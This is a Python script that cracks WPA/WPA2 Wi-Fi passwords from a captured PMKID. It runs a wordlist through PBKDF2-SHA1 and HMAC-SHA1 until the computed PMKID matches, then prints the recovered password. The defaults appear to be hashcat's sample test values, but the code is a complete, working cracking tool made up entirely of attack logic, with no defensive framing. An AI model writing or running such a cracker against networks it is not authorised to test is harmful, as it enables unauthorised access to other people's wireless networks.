import pbkdf2
import hashlib
import hmac
import struct

# Read passlist.txt into a python list
with open('passlist.txt', 'r') as f:
  passlist = f.read().splitlines()

def crack_password(
    pmkid="4d4fe7aac3a2cecab195321ceb99a7d0", 
    essid=b"hashcat-essid", 
    mac_ap=b"\xfc\x69\x0c\x15\x82\x64", 
    mac_cl=b"\xf4\x74\x7f\x87\xf9\xf4", 
    passlist=passlist):

    print('\033[95m')
    print("PMKID:                    ", pmkid)
    print("SSID:                     ", essid.decode())
    print("AP MAC Address:           ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_ap))
    print("Client MAC Address:       ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_cl))
    print('\x1b[0m')

    _continue = input("Attempt crack with these settings? (y/n): ")
    if _continue == "y":
      pass
    else:
      return    

    print('\033[1m' + '\33[33m' + "Attempting to crack password...\n" + '\x1b[0m')

    for password in passlist:
        pmk = pbkdf2.pbkdf2(hashlib.sha1, bytes(password, 'utf-8'), essid, 4096, 32)

        _pmkid = hmac.digest(pmk, b"PMK Name"+mac_ap+mac_cl, hashlib.sha1).hex()[0:32]

        if (_pmkid == pmkid):
            print('\033[92m' + _pmkid, "- Matches captured PMKID\n")
            print("Password Cracked!\n" + '\x1b[0m')
            print("SSID:             ", essid.decode())
            print("Password:         ", password)
            print("\n")
            return
        
        print(_pmkid)

    print('\033[91m' + "\nFailed to crack password. " + 
          "It may help to try a different passwords list or to refine algorithm." + 
          '\x1b[0m' + "\n")